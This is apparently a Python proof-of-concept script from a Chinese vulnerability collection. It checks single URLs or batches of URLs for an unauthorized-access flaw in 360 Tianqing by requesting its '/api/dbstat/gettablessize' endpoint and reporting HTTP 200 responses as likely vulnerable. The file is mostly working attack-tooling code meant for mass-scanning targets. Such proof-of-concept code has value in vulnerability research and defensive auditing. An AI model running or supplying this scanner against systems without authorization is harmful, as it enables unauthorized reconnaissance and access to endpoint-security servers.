'''
Author: your name
Date: 2021-04-08 12:53:25
LastEditTime: 2021-04-08 14:14:11
LastEditors: Please set LastEditors
Description: In User Settings Edit
FilePath: \Library-POC-master\2021hw漏洞\360.py
'''
import binascii
import requests
import subprocess
import time
import json
import os
import sys

from requests.sessions import session
os.system('')
from requests.packages.urllib3.exceptions import InsecureRequestWarning
# 禁用安全请求警告
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import argparse

class poc():
    def title(self):
        print('''
+-----------------------------------------------------------------+
漏洞名称:天擎 越权访问  
功能：单个检测，批量检测                                     
单个检测：python poc.py -u url
批量检测：python poc.py -f 1.txt
+-----------------------------------------------------------------+                                     
''')
    #漏洞检测
    def poc(self, target_url, hex_data):
        url = f'{target_url}/api/dbstat/gettablessize'
        headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.198 Safari/537.36'}
        try:
            res = requests.get(url=url,
                                headers=headers,
                                verify=False,
                                timeout=10)
            return res.status_code
        except Exception as e:
            print("\033[31m[x] 请求失败 \033[0m", e)
            
    def main(self, target_url, file):
        self.title()
        count=0
        if target_url:
            session = requests.session()
            status_code=self.poc(target_url, session)
            if status_code==200:
                print(f'\033[31m[+] 响应值为200，{target_url} 可能存在漏洞\033[0m')
        elif file:
            for url in file:
                count += 1
                target_url = url.replace('\n', '')  #取消换行符
                session = requests.session()
                time.sleep(1)
                self.poc(target_url, session)
                status_code=self.poc(target_url, session)
                if status_code==200:
                    print(f'\033[31m[{count}] 响应值为200，{target_url} 可能存在漏洞\033[0m')
                else:
                    print(f'[{count}] 响应值为{status_code}，{target_url} 不存在漏洞')
if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('-u',
                        '--url',
                        type=str,
                        default=False,
                        help="目标地址，带上http://")
    parser.add_argument("-f",
                        '--file',
                        type=argparse.FileType('r'),
                        default=False,
                        help="批量检测，带上http://")
    args = parser.parse_args()
    run = poc()
    run.main(args.url, args.file)
